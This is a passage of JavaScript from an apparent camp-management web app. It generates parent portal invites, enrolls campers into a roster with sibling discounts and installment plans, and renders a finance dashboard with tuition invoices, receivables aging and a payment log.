        Promise.all([doUpsert(parentEmail,parentName),doUpsert(parent2Email,parent2Name)]).then(function(results){
            var primary=results[0],secondary=results[1];
            if(!primary||primary.error){toast('Could not save invite'+(primary&&primary.error?': '+primary.error:'')+'. Run migration 011 in Supabase.');return;}
            if(secondary&&secondary.error){console.error('[Me] Second parent invite failed:',secondary.error);secondary=null;}
            _showInviteModal(enrollId,primary,secondary);
        });
        return;
    }

    // Silent path: only refresh an invite that ALREADY exists for this
    // parent — never silently create one. Each parent's email is checked
    // independently, so a second parent who was already invited keeps
    // getting refreshed even if the first parent's row is untouched.
    function silentRefresh(pEmail,pName){
        if(!pEmail)return;
        db.from('link_parent_invites').select('id').eq('camp_id',campId).eq('parent_email',pEmail).eq('status','active').limit(1)
            .then(function(res){
                if(res.error||!res.data||!res.data.length)return;
                doUpsert(pEmail,pName);
            });
    }
    silentRefresh(parentEmail,parentName);
    silentRefresh(parent2Email,parent2Name);
}

// primary/secondary: {email,name,url,accessCode} — secondary is null/absent
// when there's no second parent (or they share the primary's email). Each
// gets their OWN link/code because each has their OWN link_parent_invites
// row, so either parent can create an independent Link portal login.
function _showInviteModal(enrollId,primary,secondary){
    var e=enrollments[enrollId]||{};
    var firstName=(e.camperName||'').split(' ')[0]||'your child';

    function renderParentBlock(p,label){
        var pName=p.name||p.email||'Parent';
        var pFirst=pName.split(' ')[0];
        var h='';
        if(label)h+='<div style="font-size:.78rem;font-weight:700;color:var(--s600);text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px;">'+esc(label)+' — '+esc(pName)+'</div>';
        h+='<p style="font-size:.85rem;color:var(--s600);margin-bottom:14px;">Share <strong>either</strong> of these with <strong>'+esc(pFirst)+'</strong> — they only need one to get started.</p>';

        if(p.accessCode){
            h+='<div style="background:#EFF6FF;border:2px solid #BFDBFE;border-radius:10px;padding:14px 16px;margin-bottom:14px;">';
            h+='<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">';
            h+='<span style="font-size:.72rem;font-weight:700;color:#1D4ED8;text-transform:uppercase;letter-spacing:.06em;">Access Code</span>';
            h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="var b=this;navigator.clipboard.writeText(\''+p.accessCode+'\').then(function(){b.textContent=\'Copied ✓\';setTimeout(function(){b.textContent=\'Copy\'},2000)})" style="font-size:.72rem;padding:3px 10px;">Copy</button>';
            h+='</div>';
            h+='<div style="font-size:1.5rem;font-weight:800;letter-spacing:.2em;color:#1E40AF;font-family:monospace;">'+esc(p.accessCode)+'</div>';
            h+='<div style="font-size:.72rem;color:#3B82F6;margin-top:4px;">Parent goes to the portal URL and enters this code after creating an account</div>';
            h+='</div>';
        }

        h+='<div style="margin-bottom:14px;">';
        h+='<div style="font-size:.72rem;font-weight:700;color:var(--s500);text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px;">Or — One-click Invite Link</div>';
        h+='<div style="background:var(--s50);border:1px solid var(--s200);border-radius:8px;padding:10px 12px;display:flex;align-items:center;gap:8px;">';
        h+='<span style="font-size:.72rem;color:var(--s600);flex:1;word-break:break-all;font-family:monospace;">'+esc(p.url)+'</span>';
        h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="var b=this;navigator.clipboard.writeText(\''+p.url.replace(/'/g,"\\'")+'\'||document.location).then(function(){b.textContent=\'Copied ✓\';toast(\'Link copied!\');setTimeout(function(){b.textContent=\'Copy\'},2500)})" style="white-space:nowrap;flex-shrink:0;font-size:.72rem;padding:4px 10px;">Copy</button>';
        h+='</div></div>';

        h+='<details style="margin-bottom:14px;">';
        h+='<summary style="font-size:.8rem;font-weight:600;color:var(--s600);cursor:pointer;user-select:none;">Preview email message</summary>';
        h+='<div style="margin-top:10px;background:#fff;border:1px solid var(--s200);border-radius:8px;padding:14px;font-size:.82rem;line-height:1.7;color:var(--s700);white-space:pre-wrap;">';
        h+='Dear '+esc(pFirst)+',\n\nWe\'re excited to let you know that <strong>'+esc(firstName)+'</strong> has been accepted to camp!\n\n';
        if(p.accessCode)h+='Your access code for the Campistry Link parent portal is: <strong>'+esc(p.accessCode)+'</strong>\n\nOr click the link below to get started directly:\n\n';
        h+='<a href="'+esc(p.url)+'" style="color:#3B82F6;">'+esc(p.url)+'</a>\n\nWe look forward to a wonderful summer!\n\nCamp Office';
        h+='</div></details>';

        if(p.email){
            h+='<div style="font-size:.75rem;color:var(--s400);">';
            h+='<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align:-2px;margin-right:4px;"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>';
            h+=esc(p.email)+'</div>';
        }
        return h;
    }

    var h='<div style="max-width:500px;">';
    h+='<div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;">';
    h+='<div style="width:44px;height:44px;border-radius:50%;background:#DBEAFE;display:flex;align-items:center;justify-content:center;flex-shrink:0;">';
    h+='<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#3B82F6" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>';
    h+='</div>';
    h+='<div><div style="font-size:1rem;font-weight:700;color:var(--s800);">Parent Portal Invite'+(secondary?'s':'')+' Ready</div>';
    h+='<div style="font-size:.8rem;color:var(--s500);">'+esc(e.camperName||'')+'\'s acceptance</div></div></div>';

    h+=renderParentBlock(primary,secondary?'Parent 1':'');
    if(secondary){
        h+='<hr style="border:none;border-top:1px solid var(--s200);margin:4px 0 18px;">';
        h+=renderParentBlock(secondary,'Parent 2');
    }

    h+='</div>';
    showModal('Parent Portal Invite',h);
}

function autoPromoteWaitlist(sessionName){
    var sesObj=sessions.find(function(s){return s.name===sessionName});
    if(!sesObj||!sesObj.capacity)return; // no cap = no waitlist needed
    var enrolled=Object.values(enrollments).filter(function(e){return e.session===sessionName&&(e.status==='enrolled'||e.status==='accepted')}).length;
    if(enrolled>=sesObj.capacity)return; // still full
    // Find oldest waitlisted application for this session
    var waitlisted=Object.entries(enrollments).filter(function([,e]){return e.session===sessionName&&e.status==='waitlisted'}).sort(function(a,b){return(a[1].appliedDate||'').localeCompare(b[1].appliedDate||'')});
    if(waitlisted.length){
        var[wid,we]=waitlisted[0];
        we.status='accepted';
        we.statusHistory=we.statusHistory||[];
        we.statusHistory.push({from:'waitlisted',to:'accepted',date:new Date().toISOString(),by:'auto-promote'});
        toast('Auto-promoted '+we.camperName+' from waitlist!');
        console.log('[Me] Waitlist auto-promote: '+we.camperName+' for '+sessionName);
    }
}

function enrollCamper(id){
    var e=enrollments[id];if(!e)return;
    e.status='enrolled';
    // Auto-create camper in roster with ALL application data
    if(!roster[e.camperName]){
        var newId=nextCamperId;nextCamperId++;
        roster[e.camperName]={
            camperId:newId,
            dob:e.dob||'',gender:e.gender||'',
            school:e.school||'',schoolGrade:e.schoolGrade||'',teacher:e.teacher||'',
            division:'',grade:'',bunk:'',teams:{},team:'',
            street:e.street||'',city:e.city||'',state:e.state||'',zip:e.zip||'',
            parent1Name:e.parentName||'',parent1Phone:e.parentPhone||'',parent1Email:e.parentEmail||'',
            parent2Name:e.parent2Name||'',parent2Phone:e.parent2Phone||'',parent2Email:e.parent2Email||'',parent2Relation:e.parent2Relation||'',
            emergencyName:e.emergencyName||'',emergencyPhone:e.emergencyPhone||'',emergencyRel:e.emergencyRel||'',
            allergies:e.allergies||'',medications:e.medications||'',dietary:e.dietary||'',
            smsEmailConsent:!!e.smsEmailConsent
        };
        // Sync address to Go
        if(e.street)syncAddressToGo(e.camperName,roster[e.camperName]);
        // loadData()'s sync already ran before this camper existed in the
        // roster — if the Post-Acceptance Form was already answered before
        // Enroll was clicked, this camper would otherwise show no bunk
        // requests until the next full page load.
        _syncPostAcceptBunkRequests();
        // If Camp Structure has a bunk group mapped to this camper's real
        // school grade, place them in it right away instead of leaving
        // division/grade blank until someone runs Auto-Generate — Bunk
        // Builder's Unassigned pool then already shows the right grade.
        var resolvedCohort=_resolveCohortBySchoolGrade(roster[e.camperName].schoolGrade);
        if(resolvedCohort){ roster[e.camperName].division=resolvedCohort.div; roster[e.camperName].grade=resolvedCohort.gr; }
        toast('Enrolled — camper added to roster with all info');
    }else{
        // Update existing camper with any missing data from application
        var c=roster[e.camperName];
        if(!c.dob&&e.dob)c.dob=e.dob;
        if(!c.gender&&e.gender)c.gender=e.gender;
        if(!c.school&&e.school)c.school=e.school;
        if(!c.schoolGrade&&e.schoolGrade)c.schoolGrade=e.schoolGrade;
        if(!c.teacher&&e.teacher)c.teacher=e.teacher;
        if(!c.street&&e.street){c.street=e.street;c.city=e.city;c.state=e.state;c.zip=e.zip;syncAddressToGo(e.camperName,c)}
        if(!c.parent1Name&&e.parentName){c.parent1Name=e.parentName;c.parent1Phone=e.parentPhone;c.parent1Email=e.parentEmail}
        if(!c.parent2Name&&e.parent2Name){c.parent2Name=e.parent2Name;c.parent2Phone=e.parent2Phone;c.parent2Email=e.parent2Email;c.parent2Relation=e.parent2Relation}
        if(!c.smsEmailConsent&&e.smsEmailConsent)c.smsEmailConsent=true; // never downgrade consent already captured
        if(!c.emergencyName&&e.emergencyName){c.emergencyName=e.emergencyName;c.emergencyPhone=e.emergencyPhone;c.emergencyRel=e.emergencyRel}
        if(!c.allergies&&e.allergies)c.allergies=e.allergies;
        if(!c.medications&&e.medications)c.medications=e.medications;
        if(!c.dietary&&e.dietary)c.dietary=e.dietary;
        toast('Enrolled — updated existing camper');
    }
    // Auto-family: join an EXISTING family only on a 3-of-4 match (last name,
    // address, parent email, parent name) — not on a shared last name alone.
    var lastName=e.camperName.split(' ').pop();
    var addr=[e.street,e.city,e.state,e.zip].filter(Boolean).join(', ');
    var famKey=_resolveFamilyKey(e.camperName,_famItemRaw(e.camperName,e.street,e.city,e.state,e.zip,e.parentName,e.parentEmail));
    var sesObj=sessions.find(function(s){return s.name===e.session});
    var tuition=e.sessionTuition||sesObj?.tuition||0;

    // Sibling discount only when actually joining a matched family that
    // already has campers.
    if(sesObj&&sesObj.siblingDiscount>0&&famKey&&families[famKey]&&families[famKey].camperIds.length>0){
        var discAmt=Math.round(tuition*sesObj.siblingDiscount/100);
        tuition-=discAmt;
        e.discount={pct:sesObj.siblingDiscount,amt:discAmt};
        console.log('[Me] Sibling discount applied: '+sesObj.siblingDiscount+'% (-'+fm(discAmt)+') for '+e.camperName);
    }

    if(famKey&&families[famKey]){
        if(families[famKey].camperIds.indexOf(e.camperName)<0) families[famKey].camperIds.push(e.camperName);
        families[famKey].balance=(families[famKey].balance||0)+tuition;
    }else if(e.parentName){
        famKey='fam_'+lastName.toLowerCase().replace(/[^a-z0-9]/g,'')+'_'+(roster[e.camperName]?roster[e.camperName].camperId:Date.now());
        var parents=[{name:e.parentName,phone:e.parentPhone||'',email:e.parentEmail||'',relation:e.parentRelation||'Parent'}];
        if(e.parent2Name)parents.push({name:e.parent2Name,phone:e.parent2Phone||'',email:e.parent2Email||'',relation:e.parent2Relation||'Parent'});
        families[famKey]={
            name:lastName+' Family',
            households:[{label:'Primary',parents:parents,address:addr,billingContact:true}],
            camperIds:[e.camperName],
            balance:tuition,totalPaid:0,
            notes:'Enrolled via registration — '+e.session
        };
    }

    // Generate payment plan / installment schedule
    var schedule=_buildInstallmentSchedule(sesObj,tuition);
    if(schedule){
        e.installments=schedule;
        console.log('[Me] Payment plan: '+e.installments.length+' installments for '+e.camperName);
    }

    e.enrolledDate=new Date().toISOString().split('T')[0];
    save();_refreshPplIfActive();
}

// Down payment (deposit) vs. the rest of tuition are genuinely different
// things to a parent and to the office — this is the one place that split
// gets computed, shared by enrollCamper() (persists it once someone's
// actually enrolled) and buildFamilyLedgers() (previews it for an accepted-
// but-not-yet-enrolled applicant, so Billing shows the real payment
// structure instead of one lump "Tuition" number).
function _buildInstallmentSchedule(sesObj,tuition){
    if(!sesObj||!sesObj.paymentPlan||sesObj.paymentPlan==='full')return null;
    var plan=sesObj.paymentPlan,out=[],today=new Date();
    if(plan==='deposit'){
        var dep=sesObj.depositAmount||Math.round(tuition*0.25);
        out.push({label:'Down Payment',amount:dep,dueDate:today.toISOString().split('T')[0],status:'pending'});
        out.push({label:'Remaining Tuition',amount:tuition-dep,dueDate:sesObj.startDate||'',status:'pending'});
    }else{
        var numPayments=parseInt(plan)||2;
        var perPayment=Math.floor(tuition/numPayments);
        var remainder=tuition-(perPayment*numPayments);
        for(var pi=0;pi<numPayments;pi++){
            var due=new Date(today);due.setDate(due.getDate()+30*pi);
            var amt=perPayment+(pi===0?remainder:0);
            out.push({label:'Payment '+(pi+1)+' of '+numPayments,amount:amt,dueDate:due.toISOString().split('T')[0],status:'pending'});
        }
    }
    return out;
}

// ── ANALYTICS & FINANCE ──────────────────────────────────────
var _finTab='overview';
var FIN_CATS=['Food & Catering','Supplies & Equipment','Facilities & Rent','Insurance','Transportation','Activities & Trips','Marketing','Utilities','Miscellaneous'];
var FIN_ROLES=['Head Counselor','Counselor','Junior Counselor','Specialist','Nurse','Kitchen Staff','Bus Driver','Office Staff','Director','Maintenance'];
var BAR_COLORS=['#D97706','#3B82F6','#10B981','#8B5CF6','#EF4444','#0EA5E9','#F59E0B','#EC4899','#6366F1','#14B8A6'];

function renderAnalytics(){
    var c=document.getElementById('page-analytics');

    // ═══ AUTO-GENERATE INVOICES FROM ENROLLMENTS ═══
    // Every enrolled camper = an invoice. No manual entry needed.
    var autoInvoices=[];
    var overdueDays=finBudget.overdueDays||30; // configurable threshold
    var todayStr=new Date().toISOString().split('T')[0];
    var todayMs=new Date().getTime();

    Object.entries(enrollments).forEach(function([id,e]){
        if(e.status!=='enrolled'&&e.status!=='accepted')return;
        var tuition=e.sessionTuition||0;
        if(!tuition)return;
        // Check if manual payment exists for this camper
        var manualPay=finPayments.filter(function(p){return p.family===e.camperName||p.family===(e.camperLast||'')+' Family'||p.enrollmentId===id});
        // Pending (e.g. ACH still settling) and failed online payments are shown
        // in the log but do NOT count as collected until they succeed.
        var paidAmount=manualPay.reduce(function(s,p){return s+((p.status==='pending'||p.status==='failed')?0:(p.amount||0))},0);
        var payStatus='pending';
        if(paidAmount>=tuition)payStatus='paid';
        else if(paidAmount>0)payStatus='partial';
        else{
            // Check if overdue based on enrollment date
            var enrollDate=new Date(e.appliedDate||todayStr);
            var daysSince=Math.floor((todayMs-enrollDate.getTime())/(1000*60*60*24));
            if(daysSince>overdueDays)payStatus='overdue';
        }
        // Discount applied?
        var discountAmt=0;
        if(e.discount){
            if(e.discount.pct)discountAmt=Math.round(tuition*e.discount.pct/100);
            if(e.discount.amt)discountAmt+=e.discount.amt;
        }
        var netTuition=tuition-discountAmt;
        // Get Camper ID from roster
        var camperData=roster[e.camperName]||{};
        var camperId=camperData.camperId||0;
        var camperIdStr=camperId?String(camperId).padStart(4,'0'):'—';
        autoInvoices.push({
            id:id,camperId:camperId,camperIdStr:camperIdStr,
            camper:e.camperName,family:e.parentName,session:e.session||'',
            tuition:tuition,discount:discountAmt,netTuition:netTuition,
            paid:paidAmount,balance:Math.max(netTuition-paidAmount,0),
            status:payStatus,method:e.paymentMethod||'',
            enrollDate:e.appliedDate||'',dueDate:'',
            isOverdue:payStatus==='overdue'
        });
    });

    // ═══ AUTO-COMPUTE ALL TOTALS ═══
    var totalPayroll=finStaff.reduce(function(s,x){return s+(x.salary||0)},0);
    var totalExp=finExpenses.reduce(function(s,x){return s+(x.amount||0)},0);
    var projected=autoInvoices.reduce(function(s,inv){return s+inv.netTuition},0);
    var totalCollected=autoInvoices.reduce(function(s,inv){return s+inv.paid},0);
    var totalOutstanding=autoInvoices.reduce(function(s,inv){return s+inv.balance},0);
    var paidCount=autoInvoices.filter(function(inv){return inv.status==='paid'}).length;
    var partialCount=autoInvoices.filter(function(inv){return inv.status==='partial'}).length;
    var overdueCount=autoInvoices.filter(function(inv){return inv.status==='overdue'}).length;
    var pendingCount=autoInvoices.filter(function(inv){return inv.status==='pending'}).length;
    var netIncome=totalCollected-totalPayroll-totalExp;
    var enrolledCount=autoInvoices.length;

    var tabs=[{k:'overview',l:'Overview'},{k:'revenue',l:'Revenue'},{k:'payroll',l:'Payroll'},{k:'expenses',l:'Expenses'},{k:'budget',l:'Budget'},{k:'integrations',l:'Integrations'}];

    var h='<div class="sec-hd"><div><h2 class="sec-title">Analytics & Finance</h2><p class="sec-desc">Financial command center</p></div>';
    h+='<div class="sec-actions">';
    h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.finExportCSV()">↓ Export CSV</button>';
    h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.finExportQB()">↓ QuickBooks</button>';
    h+='<button class="me-btn me-btn--sec me-btn--sm" onclick="CampistryMe.finSetBudget()">Set Budget</button>';
    h+='</div></div>';

    // Sub-tabs
    h+='<div style="display:flex;gap:0;border-bottom:1px solid var(--s200);margin-bottom:14px">';
    tabs.forEach(function(t){
        h+='<button class="me-btn me-btn--ghost" style="padding:8px 16px;font-size:.8rem;font-weight:600;border-bottom:2px solid '+(_finTab===t.k?'var(--me)':'transparent')+';color:'+(_finTab===t.k?'var(--me)':'var(--s400)')+';border-radius:0" onclick="CampistryMe.finSetTab(\''+t.k+'\')">'+t.l+'</button>';
    });
    h+='</div>';

    function stat(label,value,sub,color){return'<div style="flex:1;min-width:140px;background:#fff;border-radius:var(--r);padding:12px 14px;border:1px solid var(--s200);border-left:3px solid '+color+'"><div style="font-size:.65rem;font-weight:700;color:var(--s400);text-transform:uppercase;letter-spacing:.04em">'+label+'</div><div style="font-size:1.2rem;font-weight:800;color:var(--s800);margin-top:2px">'+value+'</div>'+(sub?'<div style="font-size:.72rem;color:var(--s400);margin-top:1px">'+sub+'</div>':'')+'</div>'}
    function bar(items,maxVal){var bh='';items.forEach(function(item,i){var pct=maxVal>0?Math.round(item.value/maxVal*100):0;var color=BAR_COLORS[i%BAR_COLORS.length];bh+='<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px"><div style="width:90px;font-size:.75rem;font-weight:600;color:var(--s500);text-align:right;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">'+esc(item.name)+'</div><div style="flex:1;height:20px;background:var(--s100);border-radius:4px;overflow:hidden"><div style="width:'+pct+'%;height:100%;background:'+color+';border-radius:4px;transition:width .3s"></div></div><div style="width:60px;font-size:.75rem;font-weight:700;color:var(--s700);text-align:right">'+fm(item.value)+'</div></div>'});return bh}

    if(_finTab==='overview'){
        // Overdue alert banner
        if(overdueCount>0){
            h+='<div style="background:#FEF2F2;border:1px solid #FECACA;border-radius:var(--r);padding:10px 14px;margin-bottom:10px;display:flex;align-items:center;gap:8px"><span style="font-size:18px">⚠️</span><div><div style="font-size:.85rem;font-weight:700;color:var(--err)">'+overdueCount+' overdue account'+(overdueCount>1?'s':'')+'</div><div style="font-size:.75rem;color:#991B1B">'+fm(autoInvoices.filter(function(i){return i.isOverdue}).reduce(function(s,i){return s+i.balance},0))+' outstanding past '+overdueDays+' days</div></div></div>';
        }
        h+='<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">';
        h+=stat('Projected Revenue',fm(projected),enrolledCount+' enrolled campers','var(--me)');
        h+=stat('Collected',fm(totalCollected),projected>0?Math.round(totalCollected/projected*100)+'% of projected':'','var(--ok)');
        h+=stat('Outstanding',fm(totalOutstanding),overdueCount+' overdue, '+pendingCount+' pending','var(--err)');
        h+=stat('Net Income',fm(netIncome),netIncome>=0?'Positive':'Deficit',netIncome>=0?'var(--ok)':'var(--err)');
        h+='</div><div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px">';
        h+=stat('Total Payroll',fm(totalPayroll),finStaff.length+' staff','#3B82F6');
        h+=stat('Total Expenses',fm(totalExp),finExpenses.length+' items','#8B5CF6');
        h+=stat('Total Costs',fm(totalPayroll+totalExp),'Payroll + Expenses','var(--s600)');
        h+=stat('Profit Margin',projected>0?Math.round(netIncome/projected*100)+'%':'—','Net / Revenue','#0EA5E9');
        h+='</div>';

        // ═══ A/R AGING — outstanding balance bucketed by age of the invoice ═══
        var aging=[{l:'Current (0–30 days)',v:0,c:'var(--ok)'},{l:'31–60 days',v:0,c:'var(--me)'},{l:'61–90 days',v:0,c:'#F97316'},{l:'90+ days',v:0,c:'var(--err)'}];
        autoInvoices.forEach(function(inv){
            if(inv.balance<=0)return;
            var days=Math.floor((todayMs-new Date(inv.enrollDate||todayStr).getTime())/86400000);
            if(days<=30)aging[0].v+=inv.balance; else if(days<=60)aging[1].v+=inv.balance; else if(days<=90)aging[2].v+=inv.balance; else aging[3].v+=inv.balance;
        });
        var agingTotal=aging.reduce(function(s,b){return s+b.v},0);
        h+='<div class="me-card" style="margin-bottom:14px;padding:16px"><div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:10px"><h4 style="font-size:.85rem;font-weight:700;color:var(--s700);margin:0">Accounts Receivable — Aging</h4><span style="font-size:.72rem;color:var(--s400)">Total outstanding '+fm(agingTotal)+'</span></div>';
        h+='<div style="display:flex;height:10px;border-radius:5px;overflow:hidden;background:var(--s100);margin-bottom:12px">';
        aging.forEach(function(b){var pct=agingTotal>0?b.v/agingTotal*100:0;if(pct>0)h+='<div style="width:'+pct+'%;background:'+b.c+'" title="'+esc(b.l)+': '+fm(b.v)+'"></div>';});
        h+='</div><div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px">';
        aging.forEach(function(b){h+='<div style="text-align:center;padding:8px 6px;border:1px solid var(--s200);border-radius:var(--r);border-top:3px solid '+b.c+'"><div style="font-size:1.05rem;font-weight:800;color:var(--s800)">'+fm(b.v)+'</div><div style="font-size:.68rem;color:var(--s400);font-weight:600;margin-top:2px">'+esc(b.l)+'</div></div>';});
        h+='</div></div>';

        // Enrollment funnel
        var eArr=Object.entries(enrollments);
        var funnel=[{name:'Applied',count:eArr.length,color:'var(--s400)'},{name:'Accepted',count:eArr.filter(function([,e]){return e.status==='accepted'||e.status==='enrolled'}).length,color:'#3B82F6'},{name:'Enrolled',count:eArr.filter(function([,e]){return e.status==='enrolled'}).length,color:'var(--ok)'},{name:'Waitlisted',count:eArr.filter(function([,e]){return e.status==='waitlisted'}).length,color:'var(--me)'},{name:'Declined',count:eArr.filter(function([,e]){return e.status==='declined'}).length,color:'var(--err)'}];
        var maxFunnel=funnel[0].count||1;
        h+='<div style="display:flex;gap:14px;flex-wrap:wrap">';
        h+='<div class="me-card" style="flex:1;min-width:280px;padding:16px"><h4 style="font-size:.85rem;font-weight:700;color:var(--s700);margin:0 0 10px">Enrollment Funnel</h4>';
        funnel.forEach(function(f){var pct=Math.round(f.count/maxFunnel*100);h+='<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px"><div style="width:70px;font-size:.75rem;font-weight:600;color:var(--s500);text-align:right">'+f.name+'</div><div style="flex:1;height:22px;background:var(--s100);border-radius:4px;overflow:hidden;position:relative"><div style="width:'+pct+'%;height:100%;background:'+f.color+';border-radius:4px"></div><span style="position:absolute;right:6px;top:3px;font-size:.7rem;font-weight:700;color:var(--s600)">'+f.count+'</span></div></div>'});
        h+='</div>';

        // Payment status
        h+='<div class="me-card" style="flex:1;min-width:200px;padding:16px"><h4 style="font-size:.85rem;font-weight:700;color:var(--s700);margin:0 0 10px">Payment Status</h4>';
        var payStats=[{name:'Paid',count:paidCount,color:'var(--ok)'},{name:'Partial',count:partialCount,color:'var(--me)'},{name:'Overdue',count:overdueCount,color:'var(--err)'},{name:'Pending',count:pendingCount,color:'var(--s400)'}];
        var totalPayCount=autoInvoices.length||1;
        payStats.forEach(function(p){var pct=Math.round(p.count/totalPayCount*100);h+='<div style="display:flex;align-items:center;gap:8px;margin-bottom:6px"><div style="width:10px;height:10px;border-radius:3px;background:'+p.color+';flex-shrink:0"></div><div style="flex:1;font-size:.82rem;font-weight:600;color:var(--s700)">'+p.name+'</div><div style="font-size:.82rem;font-weight:700;color:var(--s800)">'+p.count+'</div><div style="font-size:.72rem;color:var(--s400);width:35px;text-align:right">'+pct+'%</div></div>'});
        h+='</div></div>';

        // Expense breakdown
        var expByCat={};finExpenses.forEach(function(e){expByCat[e.cat]=(expByCat[e.cat]||0)+e.amount});
        var expItems=Object.entries(expByCat).map(function([name,value]){return{name:name,value:value}}).sort(function(a,b){return b.value-a.value});
        var maxExp=expItems.length?expItems[0].value:1;
        if(expItems.length){
            h+='<div class="me-card" style="margin-top:14px;padding:16px"><h4 style="font-size:.85rem;font-weight:700;color:var(--s700);margin:0 0 10px">Expense Categories</h4>';
            h+=bar(expItems,maxExp);
            h+='</div>';
        }
    }

    else if(_finTab==='revenue'){
        h+='<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px">';
        h+=stat('Total Invoiced',fm(projected),'','var(--me)');
        h+=stat('Collected',fm(totalCollected),'','var(--ok)');
        h+=stat('Outstanding',fm(totalOutstanding),'','var(--err)');
        h+=stat('Collection Rate',projected>0?Math.round(totalCollected/projected*100)+'%':'—','','#3B82F6');
        h+='</div>';

        // Auto-invoice explanation
        h+='<div style="background:#FFF7ED;border:1px solid #FDBA74;border-radius:var(--r);padding:10px 14px;margin-bottom:10px;font-size:.78rem;color:var(--s600)"><strong style="color:var(--me)">Auto-Generated Invoices</strong> — Each enrolled camper automatically creates an invoice based on their session tuition. Record payments below to update balances.</div>';

        // Overdue threshold setting
        h+='<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:6px">';
        h+='<div style="font-size:.78rem;color:var(--s400)">Accounts are marked overdue after <strong>'+overdueDays+'</strong> days. <button class="me-btn me-btn--ghost me-btn--sm" style="font-size:.72rem" onclick="CampistryMe.finSetOverdue()">Change</button></div>';
        h+='<button class="me-btn me-btn--pri me-btn--sm" onclick="CampistryMe.finAddPayment()">+ Record Payment</button>';
        h+='</div>';

        // Invoices table (auto-generated)
        h+='<div class="me-card"><div class="me-card-head"><h3>Tuition Invoices ('+autoInvoices.length+' accounts)</h3></div><div class="me-tw"><table class="me-t"><thead><tr><th style="width:70px">Invoice #</th><th>Camper</th><th>Parent</th><th>Session</th><th>Tuition</th><th>Discount</th><th>Paid</th><th>Balance</th><th>Status</th></tr></thead><tbody>';
        autoInvoices.sort(function(a,b){return a.status==='overdue'?-1:b.status==='overdue'?1:a.camper.localeCompare(b.camper)});
        var invPaged=_paginate(autoInvoices,PAGE_SIZE,_analyticsInvoicePage);
        invPaged.items.forEach(function(inv){
            var sc=inv.status==='paid'?'ok':inv.status==='partial'?'warn':inv.status==='overdue'?'err':'gray';
            var rowStyle=inv.isOverdue?'background:rgba(239,68,68,.03)':'';
            h+='<tr style="'+rowStyle+'">';
            h+='<td style="font-family:monospace;font-size:.78rem;color:var(--s500)">#'+esc(inv.camperIdStr)+'</td>';
            h+='<td class="bold">'+(inv.isOverdue?'⚠ ':'')+esc(inv.camper)+'</td>';
            h+='<td>'+esc(inv.family||'—')+'</td>';
            h+='<td style="font-size:.78rem">'+esc(inv.session||'—')+'</td>';
            h+='<td>'+fm(inv.tuition)+'</td>';
            h+='<td>'+(inv.discount?'<span style="color:var(--ok)">-'+fm(inv.discount)+'</span>':'—')+'</td>';
            h+='<td style="color:var(--ok);font-weight:600">'+fm(inv.paid)+'</td>';
            h+='<td style="font-weight:700;color:'+(inv.balance>0?'var(--err)':'var(--ok)')+'">'+fm(inv.balance)+'</td>';
            h+='<td>'+bdg(inv.status,sc)+'</td>';
            h+='</tr>';
        });
        h+='</tbody></table>'+_pagerHtml(autoInvoices.length,PAGE_SIZE,_analyticsInvoicePage,'setAnalyticsInvoicePage')+'</div></div>';

        // Manual payment log (supplementary)
        if(finPayments.length){
            var sortedPayments=finPayments.slice().sort(function(a,b){return(b.date||'').localeCompare(a.date||'')});
            var payPaged=_paginate(sortedPayments,PAGE_SIZE,_analyticsPaymentPage);
            h+='<div class="me-card" style="margin-top:14px"><div class="me-card-head"><h3>Payment Log</h3></div><div class="me-tw"><table class="me-t"><thead><tr><th>Date</th><th>Family/Camper</th><th>Amount</th><th>Method</th><th></th></tr></thead><tbody>';
            payPaged.items.forEach(function(p,i){
                if(p.id==null)p.id='pay_'+i+'_'+(p.date||'')+'_'+(p.amount||0);  // backfill a stable id for legacy rows
                var _isRef=(p.amount||0)<0;
                var _st=p.status||'';
                var _pend=(_st==='pending'||_st==='failed');
                var _amtTxt=_isRef?'−'+fm(Math.abs(p.amount)):fm(p.amount);
                var _amtCol=_isRef?'var(--err)':_pend?'var(--s400)':'var(--ok)';
                var _stBadge=_st==='pending'?' '+bdg('pending','warn'):_st==='failed'?' '+bdg('failed','err'):'';
                var _canRefund=!_isRef&&!_pend&&(p.amount||0)>0;
                var _acts=(_canRefund?'<button class="me-btn me-btn--ghost me-btn--sm" onclick="CampistryMe.finRefund(\''+je(String(p.id))+'\')">↩ Refund</button>':'')+'<button class="me-btn me-btn--ghost me-btn--sm" style="color:var(--err)" onclick="CampistryMe.finRemovePayment(\''+je(String(p.id))+'\')">✕</button>';
                h+='<tr><td style="font-size:.75rem;color:var(--s400)">'+esc(p.date||'—')+'</td><td class="bold">'+esc(p.family)+(_isRef&&p.notes?' <span style="font-size:.7rem;font-weight:400;color:var(--s400)">'+esc(p.notes)+'</span>':'')+'</td><td style="font-weight:700;color:'+_amtCol+'">'+_amtTxt+'</td><td>'+bdg((_payLabel(p.method)||p.method||'—'),_isRef?'err':_st==='failed'?'err':_st==='pending'?'warn':'ok')+_stBadge+'</td><td style="text-align:right;white-space:nowrap">'+_acts+'</td></tr>';
            });
